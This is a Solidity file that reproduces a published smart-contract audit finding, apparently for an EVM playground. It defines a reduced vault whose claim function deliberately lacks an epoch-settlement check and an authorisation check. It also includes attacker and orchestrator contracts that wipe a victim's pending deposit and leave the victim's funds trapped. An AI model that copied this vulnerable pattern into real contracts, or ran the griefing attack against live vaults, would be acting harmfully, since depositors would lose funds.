// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Amphor — Claim functions don't validate if the epoch is settled
    (Sherlock, 2024-03-amphor, finding #30916, H-1, reporter jennifer37 et al.)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable AsyncSynthVault claim path (`_claimDeposit` / `previewClaimDeposit`
    / `_convertToShares` / `claimAndRequestDeposit`) is reduced but keeps the
    blamed lines VERBATIM: `_claimDeposit` computes `shares` from
    `previewClaimDeposit` (which returns 0 for the CURRENT, unsettled epoch)
    and then unconditionally zeroes the pending request — with no check that
    the request's epoch has actually settled. `claimAndRequestDeposit` lets
    ANY caller trigger `_claimDeposit` on behalf of an arbitrary `receiver`.
    The Exploit deploys everything, has a victim request a deposit, then has
    an attacker wipe that request before it settles (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 asset token used as the vault's underlying.
contract MockAsset {
    string public constant name = "Mock USD";
    string public constant symbol = "mUSD";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced AsyncSynthVault — an ERC-7540-style async deposit vault.
///         Faithful reduction of the real contract's epoch/claim accounting:
///         `AsyncSynthVault.sol` (sherlock-audit/2024-03-amphor).
contract Vault {
    MockAsset public asset;
    address public owner;
    bool public vaultIsOpen = true;
    uint256 public epochId = 1;

    // Real contract: `struct EpochData { ...snapshots...; mapping depositRequestBalance; ... }`
    struct EpochData {
        uint256 totalAssetsSnapshotForDeposit;
        uint256 totalSupplySnapshotForDeposit;
        mapping(address => uint256) depositRequestBalance;
    }

    mapping(uint256 => EpochData) internal epochs;
    mapping(address => uint256) public lastDepositRequestId;

    // Shares (the vault's own receipt token) — minimal balance/supply tracking.
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address _asset) {
        asset = MockAsset(_asset);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier whenClosed() {
        require(!vaultIsOpen, "vault open");
        _;
    }

    /// @dev Real contract: `AsyncSynthVault.close()` — owner-only, locks the vault.
    function close() external onlyOwner {
        require(vaultIsOpen, "already closed");
        vaultIsOpen = false;
    }

    /// @dev Real contract: `AsyncSynthVault.open(uint256 assetReturned)` reduced —
    ///      settles the CURRENT epoch's snapshot values and advances epochId.
    ///      Only used by the control test (the intended path where claiming
    ///      happens AFTER settlement).
    function settleAndOpen(uint256 totalAssetsSnapshot, uint256 totalSupplySnapshot) external onlyOwner whenClosed {
        epochs[epochId].totalAssetsSnapshotForDeposit = totalAssetsSnapshot;
        epochs[epochId].totalSupplySnapshotForDeposit = totalSupplySnapshot;
        vaultIsOpen = true;
        epochId++;
    }

    // ============================================================
    //  requestDeposit — faithful reduction of
    //  AsyncSynthVault.sol:L439-466 (Amphor asynchronous-vault)
    // ============================================================
    function requestDeposit(uint256 assets, address receiver, address owner_, bytes memory) public whenClosed {
        if (msg.sender != owner_) revert("cant request on behalf");
        if (previewClaimDeposit(receiver) > 0) revert("must claim first");

        asset.transferFrom(owner_, address(this), assets); // pendingSilo simplified to the vault itself

        epochs[epochId].depositRequestBalance[receiver] += assets;
        if (lastDepositRequestId[receiver] != epochId) {
            lastDepositRequestId[receiver] = epochId;
        }
    }

    function pendingDepositRequest(address who) public view returns (uint256) {
        return epochs[epochId].depositRequestBalance[who];
    }

    /// @dev Real contract: `AsyncSynthVault.isCurrentEpoch(uint256)` — verbatim.
    function isCurrentEpoch(uint256 requestId) internal view returns (bool) {
        return requestId == epochId;
    }

    /// @dev Real contract: `AsyncSynthVault._convertToShares(...)` — verbatim
    ///      logic: returns 0 while the request's epoch has not yet settled.
    function _convertToShares(uint256 assets, uint256 requestId) internal view returns (uint256) {
        if (isCurrentEpoch(requestId)) {
            return 0;
        }
        uint256 totalAssetsSnap = epochs[requestId].totalAssetsSnapshotForDeposit + 1;
        uint256 totalSupplySnap = epochs[requestId].totalSupplySnapshotForDeposit + 1;
        return assets * totalSupplySnap / totalAssetsSnap;
    }

    /// @dev Real contract: `AsyncSynthVault.previewClaimDeposit(address)` — verbatim.
    function previewClaimDeposit(address who) public view returns (uint256) {
        uint256 lastRequestId = lastDepositRequestId[who];
        uint256 assets = epochs[lastRequestId].depositRequestBalance[who];
        return _convertToShares(assets, lastRequestId);
    }

    // ============================================================
    //  _claimDeposit — faithful reduction of
    //  AsyncSynthVault.sol:L742-756 (Amphor asynchronous-vault) — THE BUG
    // ============================================================
    function _claimDeposit(address owner_, address receiver) internal returns (uint256 shares) {
        // FIX (per report): uint256 lastRequestId = lastDepositRequestId[owner_];
        //                    if (isCurrentEpoch(lastRequestId)) revert();
        shares = previewClaimDeposit(owner_); // @> VULN: no check that the request's epoch has settled

        uint256 lastRequestId = lastDepositRequestId[owner_];
        uint256 assetsOwed = epochs[lastRequestId].depositRequestBalance[owner_];
        epochs[lastRequestId].depositRequestBalance[owner_] = 0; // request wiped regardless of `shares == 0`
        balanceOf[receiver] += shares; // _update(claimableSilo, receiver, shares) simplified
        totalSupply += shares;
        assetsOwed; // silence unused-var warning; assets stay trapped in the vault, unaccounted
    }

    function claimDeposit(address receiver) public returns (uint256) {
        return _claimDeposit(msg.sender, receiver);
    }

    // ============================================================
    //  claimAndRequestDeposit — faithful reduction of
    //  AsyncSynthVault.sol:L204-213 — lets ANY caller claim on behalf of an
    //  arbitrary `receiver`, which is how the bug is weaponized as a griefing
    //  attack against other users' pending requests.
    // ============================================================
    function claimAndRequestDeposit(uint256 assets, address receiver, bytes memory data) external {
        _claimDeposit(receiver, receiver); // @> no auth check: claims on behalf of ANY `receiver`
        requestDeposit(assets, receiver, msg.sender, data);
    }
}

/// @dev A regular user who requests a deposit for themselves.
contract UserProxy {
    function approveAndRequestDeposit(Vault v, MockAsset a, uint256 assets) external {
        a.approve(address(v), assets);
        v.requestDeposit(assets, address(this), address(this), "");
    }

    function claimDeposit(Vault v) external returns (uint256) {
        return v.claimDeposit(address(this));
    }
}

/// @dev The attacker: calls `claimAndRequestDeposit(0, victim, "")` to wipe a
///      victim's pending (unsettled) deposit request without spending anything.
contract GriefAttacker {
    function wipeVictimRequest(Vault v, address victim) external {
        v.claimAndRequestDeposit(0, victim, "");
    }
}

/// @dev Orchestrator. Deploys the asset/vault/victim/attacker, funds the
///      victim, and reproduces the griefing attack end to end — cheatcode-free.
contract Exploit {
    uint256 public constant DEPOSIT_AMOUNT = 500e18;

    MockAsset public asset; // CREATE nonce 1
    Vault public vault; // CREATE nonce 2
    UserProxy public alice; // CREATE nonce 3 — victim
    GriefAttacker public attacker; // CREATE nonce 4

    constructor() {
        asset = new MockAsset();
        vault = new Vault(address(asset));
        alice = new UserProxy();
        attacker = new GriefAttacker();
        asset.mint(address(alice), DEPOSIT_AMOUNT);
    }

    function run() external {
        // 1. The vault closes (owner-only; Exploit is the owner since it deployed the vault).
        vault.close();

        // 2. Alice requests a deposit of 500 assets in the now-closed, unsettled epoch.
        alice.approveAndRequestDeposit(vault, asset, DEPOSIT_AMOUNT);
        require(vault.pendingDepositRequest(address(alice)) == DEPOSIT_AMOUNT, "request not created");

        // 3. VULN: the attacker wipes Alice's request via claimAndRequestDeposit — no
        //    authorization check on whose request gets claimed, and no check that the
        //    request's epoch has settled.
        attacker.wipeVictimRequest(vault, address(alice));

        // HARM: Alice's request is gone, she received 0 shares for her 500 assets, and
        // those assets are now stuck in the vault with no shares outstanding to claim them.
        require(vault.pendingDepositRequest(address(alice)) == 0, "request should be wiped");
        require(vault.balanceOf(address(alice)) == 0, "alice should receive 0 shares");
        require(asset.balanceOf(address(vault)) == DEPOSIT_AMOUNT, "vault silently retains alice's assets");
    }
}
